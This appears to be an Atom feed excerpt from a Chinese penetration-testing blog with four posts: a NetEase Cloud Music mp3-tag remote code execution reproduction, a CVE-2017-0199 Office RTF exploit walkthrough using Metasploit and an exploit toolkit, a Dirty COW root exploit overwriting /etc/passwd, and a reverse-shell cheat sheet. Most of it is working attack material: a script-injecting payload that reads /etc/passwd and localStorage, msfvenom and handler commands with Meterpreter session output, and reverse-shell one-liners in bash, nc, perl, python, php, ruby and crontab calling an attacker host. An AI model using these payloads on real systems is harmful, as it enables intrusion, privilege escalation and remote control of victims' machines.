    <content type="html"><![CDATA[<h3 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p>网易云音乐客户端对 mp3 处理不当导致攻击者可以构造恶意音乐文件再其用户打开后执行恶意程序，该漏洞 for macOS 版本(&lt;=1.5.2 Build538)发生在专辑/歌手/歌名处，Windows 版本(&lt;=2.1.2 Build180086)中发生在专辑处。</p><h3 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h3><p>远程加载的js代码如下</p><pre><code>(function () {    var hh = NEJ.P,        bh = NEJ.O,        bw = hh(&quot;nej.n&quot;),        A = hh(&quot;nej.e&quot;),        I = hh(&quot;nej.v&quot;),        bq = hh(&quot;nej.ut&quot;),        bd = hh(&quot;nej.cef&quot;),        bj = hh(&quot;nm.x&quot;),        cu = hh(&quot;nm.i&quot;),        oe = hh(&quot;nm.d&quot;),        bX = hh(&quot;nm.m&quot;),        bI = hh(&quot;nm.l&quot;),        bt = hh(&quot;nm.u&quot;),        bu = hh(&quot;nm.m.r&quot;),        S = setTimeout,        Z = Math.random(),        P = Math.round(Z * 10000);    var mac = function () {        s = function () {            bw.cv(&quot;os.shellOpen&quot;, path)        }        S(&quot;s()&quot;, 2000);        x = new XMLHttpRequest();        x.open(&quot;GET&quot;, &quot;file:///etc/passwd&quot;);        x.onload = function () {            S(&quot;prompt(x.responseText)&quot;, 3000);        }; x.send(null);        bw.cv(&quot;os.shellOpen&quot;,              &quot;/Applications/Calculator.app&quot;);        // UserlocalStorage        lsl = {}; for (i in localStorage) { lsl += localStorage[i] };        prompt(&quot;UserlocalStorage&quot;, lsl);    }    var win = function () {        s = function () {            bd.cFB(&quot;os.shellOpen&quot;, path)        }        S(&quot;s()&quot;, 2000);        bd.cFB(&quot;os.shellOpen&quot;, &quot;C:\\Windows\\System32\\Calc.exe&quot;);    }    var rua = function () {        var x, plat = window.navigator.platform;        if (plat.indexOf(&quot;Mac&quot;) === 0) {            mac();        } else {            win();        }    }; rua();})();</code></pre><p>构造 a 标签 onmouseover 事件导入远程服务器脚本。 Windows 可直接属性详细信息中双击唱片集编辑，插入远程脚本。macOS 可使用 iTunes 修改。</p><pre><code>&lt;a onmouseover=javascript:x=document.createElement(&quot;script&quot;);x.src=&apos;https://static-1257872780.cos.ap-shanghai.myqcloud.com/netease.js&apos;;document.head.appendChild(x);&gt;Surprise&lt;/a&gt;</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/netease-1.png" alt=""></p><p>然后用网易云音乐打开，当鼠标移动到唱片集出，就会弹出计算器。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/netease.gif" alt=""></p><h3 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h3><ol><li><a href="http://linux.im/2017/04/22/NeteaseMusic-RCE.html?utm_source=tuicool&utm_medium=referral" target="_blank" rel="noopener">网易云音乐客户端远程命令执行</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-介绍&quot;&gt;&lt;a href=&quot;#0x01-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 介绍&quot;&gt;&lt;/a&gt;0x01 介绍&lt;/h3&gt;&lt;p&gt;网易云音乐客户端对 mp3 处理不当导致攻击者可以构造恶意音乐文件再其用户打开后执行恶意程序，该漏洞
      
    
    </summary>
    
    
      <category term="penetration" scheme="http://zerokeeper.github.io/categories/penetration/"/>
    
    
      <category term="代码执行" scheme="http://zerokeeper.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-0199 Office RTF复现过程</title>
    <link href="http://zerokeeper.github.io/penetration/cve20170199-office-rtf-replication-process.html"/>
    <id>http://zerokeeper.github.io/penetration/cve20170199-office-rtf-replication-process.html</id>
    <published>2017-04-23T09:48:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>  CVE-2017-0199是首个Microsoft Office RTF漏洞，漏洞发布日期为2017年4月11日。受影响系统包括：</p><ul><li>Microsoft Office 2016</li><li>Microsoft Office 2013</li><li>Microsoft Office 2010</li><li>Microsoft Office 2007</li></ul><p>  微软官方对该漏洞的通告：<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199</a><br>  当用户打开包含嵌入式漏洞的文档时，winword.exe会向远程服务器发出HTTP请求，以检索恶意HTA文件，服务器返回的文件时一个带有嵌入式恶意脚本的假RTF文件，winword.exe通过COM对象查找application/hta的文件处理程序，这会导致Microsoft HTA应用程序（mshta.exe），加载恶意攻击者下载并执行包含PowerShell命令的Visual Basic脚本</p><h3 id="0x02-准备"><a href="#0x02-准备" class="headerlink" title="0x02 准备"></a>0x02 准备</h3><p>kali、有office的windows，这里我是office2016，ps：(windows不要用虚拟机，反正我测试2个版本的office都没有成功)<br>下面我将用三种方式来复现这一过程。</p><h3 id="0x03-手工复现"><a href="#0x03-手工复现" class="headerlink" title="0x03 手工复现"></a>0x03 手工复现</h3><p>这里我直接用的windows下的phpstudy做服务器，也可以用kali的apache。首先在打开apache配置文件，找到conf/mime.types，添加<code>AddType application/rtf .rtf</code> ，重启服务器。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/office-rtf-2.png" alt=""></p><p>然后在网站根目录下新建一个rtf文件,内容任意，最后命名ms.rtf。然后又新建一个word文档，插入=&gt;对象=&gt;由文件创建=&gt;链接到文件=&gt;ms.rtf的地址，然后将word另存为rtf格式，文件名为exp.rtf。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/office-rtf-1.png" alt=""></p><p>此时将网站根目录下的ms.rtf用记事本打开，将内容改为：</p><pre><code>&lt;script&gt;var a = new ActiveXObject(&quot;wscript.shell&quot;);a.Run(&quot;%SystemRoot%\\system32\\calc.exe&quot;);&lt;/script&gt;</code></pre><p>然后再将之前修改的apache的配置文件改为<code>AddType application/hta .rtf</code>，重启服务器。打开exp.rtf,双击内容，注意速度要连贯点<br>。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/office-rtf-1.gif" alt=""></p><p>要打开文档就弹出的话需要将\object\objautlink\rsltpict修改为\object\objautlink\objupdate\rsltpict</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/office-rtf-3.png" alt=""></p><p>效果如下：</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/office-rtf-2.gif" alt=""></p><h3 id="0x04-metasploite复现"><a href="#0x04-metasploite复现" class="headerlink" title="0x04 metasploite复现"></a>0x04 metasploite复现</h3><p>首先更新msf，下载利用脚本。</p><pre><code>cd /usr/share/metasploit-framework/modules/exploits/windows/fileformatwget https://raw.githubusercontent.com/nixawk/metasploit-framework/feature/CVE-2017-0199/modules/exploits/windows/fileformat/office_word_hta.rb</code></pre><p>下载rtf文件</p><pre><code>cd /usr/share/metasploit-framework/data/exploitswget https://raw.githubusercontent.com/nixawk/metasploit-framework/feature/CVE-2017-0199/data/exploits/cve-2017-0199.rtf</code></pre><p>开启 HTA 服务</p><pre><code>msf &gt; use exploit/windows/misc/hta_servermsf exploit(hta_server) &gt; show options Module options (exploit/windows/misc/hta_server):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0   SRVPORT  8080             yes       The local port to listen on.   SSL      false            no        Negotiate SSL for incoming connections   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)   URIPATH                   no        The URI to use for this exploit (default is random)Exploit target:   Id  Name   --  ----   0   Powershell x86msf exploit(hta_server) &gt; run[*] Exploit running as background job.[*] Started reverse TCP handler on 192.168.153.129:4444 msf exploit(hta_server) &gt; [*] Using URL: http://0.0.0.0:8080/aEOF4h.hta[*] Local IP: http://192.168.153.129:8080/aEOF4h.hta[*] Server started.</code></pre><p>生成EXPLOIT文档</p><pre><code>msf exploit(hta_server) &gt; use exploit/windows/fileformat/office_word_htamsf exploit(office_word_hta) &gt; show options Module options (exploit/windows/fileformat/office_word_hta):   Name       Current Setting              Required  Description   ----       ---------------              --------  -----------   FILENAME                                no        The file name.   TARGETURI  http://example.com/test.rtf  yes       The path to a online hta file.Exploit target:   Id  Name   --  ----   0   Microsoft Office Wordmsf exploit(office_word_hta) &gt; set TARGETURI http://192.168.153.129:8080/aEOF4h.htaTARGETURI =&gt; http://192.168.153.129:8080/aEOF4h.htamsf exploit(office_word_hta) &gt; set FILENAME msf.docFILENAME =&gt; msf.docmsf exploit(office_word_hta) &gt; run[+] msf.doc stored at /root/.msf4/local/msf.docmsf exploit(office_word_hta) &gt; </code></pre><p>将生成的msf.doc文件复制到windows上，打开即可获取一个会话。我win10要关闭defender，不然不能反弹。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/office-rtf-4.png" alt=""></p><pre><code>msf exploit(office_word_hta) &gt; [*] 192.168.153.1    hta_server - Delivering Payload[*] 192.168.153.1    hta_server - Delivering Payload[*] Sending stage (957487 bytes) to 192.168.153.1[*] Meterpreter session 1 opened (192.168.153.129:4444 -&gt; 192.168.153.1:60029) at 2017-04-23 11:17:35 +0800msf exploit(office_word_hta) &gt; sessions -i 1[*] Starting interaction with 1...meterpreter &gt; sysinfoComputer        : DESKTOP-JAJBMFNOS              : Windows 10 (Build 10240).Architecture    : x64System Language : zh_CNDomain          : WORKGROUPLogged On Users : 2Meterpreter     : x86/windowsmeterpreter &gt; </code></pre><h3 id="0x05-通过toolkit"><a href="#0x05-通过toolkit" class="headerlink" title="0x05 通过toolkit"></a>0x05 通过toolkit</h3><p>下载<a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener">toolkit</a><br>执行过程如下</p><pre><code>root@kali:~/CVE-2017-0199-master# python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.153.129/logo.docGenerating payloadGenerated Invoice.rtf successfullyroot@kali:~/CVE-2017-0199-master# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.153.129 LPORT=4444 -f exe &gt; /tmp/shell.exeNo platform was selected, choosing Msf::Module::Platform::Windows from the payloadNo Arch selected, selecting Arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 333 bytesFinal size of exe file: 73802 bytesroot@kali:~/CVE-2017-0199-master# msfconsole -x &quot;use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.153.129; run&quot;</code></pre><p>开启 HTA 服务</p><pre><code>root@kali:~/CVE-2017-0199-master# python cve-2017-0199_toolkit.py -M exp -e http://192.168.153.129/shell.exe -l /tmp/shell.exeRunning exploit mode - waiting for victim to connectServer Running on   : 80</code></pre><p>把生成的rtf文档复制给windows并打开，结果如下</p><pre><code>                 _---------.             .&apos; #######   ;.&quot;  .---,.    ;@             @@`;   .---,...&quot; @@@@@&apos;.,&apos;@@            @@@@@&apos;,.&apos;@@@@ &quot;.&apos;-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .&apos;     &quot;--&apos;.@@@  -.@        @ ,&apos;-   .&apos;--&quot;          &quot;.@&apos; ; @       @ `.  ;&apos;            |@@@@ @@@     @    .             &apos; @@@ @@   @@    ,              `.@@@@    @@   .                &apos;,@@     @   ;           _____________                 (   3 C    )     /|___ / Metasploit! \                 ;@&apos;. __*__,.&quot;    \|--- \_____________/                  &apos;(.,....&quot;/Trouble managing data? List, sort, group, tag and search your pentest datain Metasploit Pro -- learn more on http://rapid7.com/metasploit       =[ metasploit v4.14.13-dev                         ]+ -- --=[ 1642 exploits - 945 auxiliary - 289 post        ]+ -- --=[ 473 payloads - 40 encoders - 9 nops             ]+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]PAYLOAD =&gt; windows/meterpreter/reverse_tcpLHOST =&gt; 192.168.153.129[*] Started reverse TCP handler on 192.168.153.129:4444 [*] Starting the payload handler...[*] Sending stage (957487 bytes) to 192.168.153.1[*] Meterpreter session 1 opened (192.168.153.129:4444 -&gt; 192.168.153.1:60096) at 2017-04-23 11:30:46 +0800meterpreter &gt; sysinfoComputer        : DESKTOP-JAJBMFNOS              : Windows 10 (Build 10240).Architecture    : x64System Language : zh_CNDomain          : WORKGROUPLogged On Users : 2Meterpreter     : x86/windows</code></pre><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><ol><li><a href="http://fuping.site/2017/04/18/CVE-2017-0199%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/" target="_blank" rel="noopener">CVE-2017-0199漏洞复现过程</a> </li><li><a href="http://www.dxsafe.cn/1193.html" target="_blank" rel="noopener">CVE-2017-0199 复现</a> </li><li><a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener">Exploit toolkit CVE-2017-0199</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h3&gt;&lt;p&gt;  CVE-2017-0199是首个Microsoft Office RTF漏洞，漏洞发布日期为20
      
    
    </summary>
    
    
      <category term="penetration" scheme="http://zerokeeper.github.io/categories/penetration/"/>
    
    
      <category term="office" scheme="http://zerokeeper.github.io/tags/office/"/>
    
      <category term="代码执行" scheme="http://zerokeeper.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>利用dirty cow（脏牛）漏洞的提权尝试</title>
    <link href="http://zerokeeper.github.io/penetration/the-use-of-dirty-cow-dirty-cattle-loopholes-in-the-right-to-try.html"/>
    <id>http://zerokeeper.github.io/penetration/the-use-of-dirty-cow-dirty-cattle-loopholes-in-the-right-to-try.html</id>
    <published>2017-03-18T07:44:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-描述："><a href="#0x01-描述：" class="headerlink" title="0x01 描述："></a>0x01 描述：</h2><p>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权<br>影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/dirtycow.png" alt=""></p><h2 id="0x02-原理："><a href="#0x02-原理：" class="headerlink" title="0x02 原理："></a>0x02 原理：</h2><p>Linux内核的内存子系统在处理写入时复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。（A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.）</p><p>竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>官方放出的<a href="https://github.com/dirtycow/dirtycow.github.io" target="_blank" rel="noopener">EXP</a><br>centos6、7提权均失败了。连官方给的最基本的写入也失败了！<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/dirtycow1.png" alt=""></p><p>提权ubuntu就比较顺利了。首先是官方的写入测试成功了。<br>然后尝试了两个提权为root的exp。过程如下：<br>EXP1：<a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">dirtycow</a></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/dirtycow2.png" alt=""></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/dirtycow3.png" alt=""></p><p>成功。记得恢复/etc/passwd。</p><p>EXP2：<a href="https://github.com/gbonacini/CVE-2016-5195" target="_blank" rel="noopener">CVE-2016-5195</a></p><p>这个速度很快。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/dirtycow4.png" alt=""></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/dirtycow5.png" alt=""></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>原理都是利用官方的exp获取了写入权限后，对/etc/passwd进行备份，然后对/etc/passwd进行重写，修改账户权限。优点方便快速。缺点受限与环境影响。某些环境下会失败。如果失败还是使用官方放出的exp，对/etc/passwd进行写入，写入前一定要记得先备份！</p><pre><code>./dirtyc0w /etc/passwd  root:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-描述：&quot;&gt;&lt;a href=&quot;#0x01-描述：&quot; class=&quot;headerlink&quot; title=&quot;0x01 描述：&quot;&gt;&lt;/a&gt;0x01 描述：&lt;/h2&gt;&lt;p&gt;漏洞编号：CVE-2016-5195&lt;br&gt;漏洞名称：脏牛（Dirty COW）&lt;br&gt;漏洞
      
    
    </summary>
    
    
      <category term="penetration" scheme="http://zerokeeper.github.io/categories/penetration/"/>
    
    
      <category term="dirty cow" scheme="http://zerokeeper.github.io/tags/dirty-cow/"/>
    
      <category term="提权" scheme="http://zerokeeper.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>各种环境下反弹shell的方法</title>
    <link href="http://zerokeeper.github.io/experience/a-variety-of-environmental-rebound-shell-method.html"/>
    <id>http://zerokeeper.github.io/experience/a-variety-of-environmental-rebound-shell-method.html</id>
    <published>2017-03-18T01:51:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-bash版本："><a href="#0x01-bash版本：" class="headerlink" title="0x01 bash版本："></a>0x01 bash版本：</h2><pre><code>bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</code></pre><p>注意这个是由解析shell的bash完成，所以某些情况下不支持。我用zsh不能反弹。这个也是最常用的。</p><h2 id="0x02-nc版本："><a href="#0x02-nc版本：" class="headerlink" title="0x02 nc版本："></a>0x02 nc版本：</h2><p>支持-e选项</p><pre><code>nc -e /bin/sh attackerip 1234</code></pre><p>这个方式最简单<br>不能使用-e选项时：</p><pre><code>mknod backpipe p &amp;&amp; nc attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe/bin/sh | nc attackerip 4444rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/</code></pre><p>安装的NC版本有问题时：</p><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 1234 &gt;/tmp/f</code></pre><h2 id="0x03-Telnet版本：-nc不可用或-dev-tcp不可用时"><a href="#0x03-Telnet版本：-nc不可用或-dev-tcp不可用时" class="headerlink" title="0x03 Telnet版本：(nc不可用或/dev/tcp不可用时)"></a>0x03 Telnet版本：(nc不可用或/dev/tcp不可用时)</h2><pre><code>mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</code></pre><h2 id="0x04-Perl版本："><a href="#0x04-Perl版本：" class="headerlink" title="0x04 Perl版本："></a>0x04 Perl版本：</h2><pre><code>perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><p>不依赖于/bin/sh的shell： ***这条语句比上面的更为简短，而且确实不需要依赖/bin/sh</p><pre><code>perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</code></pre><h2 id="0x05-Python版本："><a href="#0x05-Python版本：" class="headerlink" title="0x05 Python版本："></a>0x05 Python版本：</h2><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><p>另外的形式：</p><pre><code>python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;127.0.0.1&apos;,9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</code></pre><p>另外Metasploit版的代码：</p><pre><code>msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.90.1 LPORT=1234import base64; exec(base64.b64decode(&apos;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg==&apos;))</code></pre><h2 id="0x06-php版本："><a href="#0x06-php版本：" class="headerlink" title="0x06 php版本："></a>0x06 php版本：</h2><pre><code>php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre><h2 id="0x07-java版本："><a href="#0x07-java版本：" class="headerlink" title="0x07 java版本："></a>0x07 java版本：</h2><pre><code>r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre><h2 id="0x08-ruby版本："><a href="#0x08-ruby版本：" class="headerlink" title="0x08 ruby版本："></a>0x08 ruby版本：</h2><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><p>不依赖于/bin/sh的shell：</p><pre><code>ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;</code></pre><p>如果目标系统运行Windows：</p><pre><code>ruby -rsocket -e &apos;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;</code></pre><h2 id="0x09-crontab定时任务："><a href="#0x09-crontab定时任务：" class="headerlink" title="0x09 crontab定时任务："></a>0x09 crontab定时任务：</h2><p>这也是在redis未授权访问的时候使用过的。<br>crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是/var/spool/cron/目录，ubuntu是/var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。具体crontab用法可以参考<a href="http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">Crontab定时任务配置</a></p><pre><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</code></pre><p>最后其实发现，虽然形式不同，但是其实都是基于/bin/bash和/bin/sh</p><h2 id="0x10-参考："><a href="#0x10-参考：" class="headerlink" title="0x10 参考："></a>0x10 参考：</h2><p><a href="http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">LINUX下反弹SHELL的种种方式</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-bash版本：&quot;&gt;&lt;a href=&quot;#0x01-bash版本：&quot; class=&quot;headerlink&quot; title=&quot;0x01 bash版本：&quot;&gt;&lt;/a&gt;0x01 bash版本：&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev
      
    
    </summary>
    
    
      <category term="experience" scheme="http://zerokeeper.github.io/categories/experience/"/>
    
    
      <category term="反弹shell" scheme="http://zerokeeper.github.io/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
</feed>
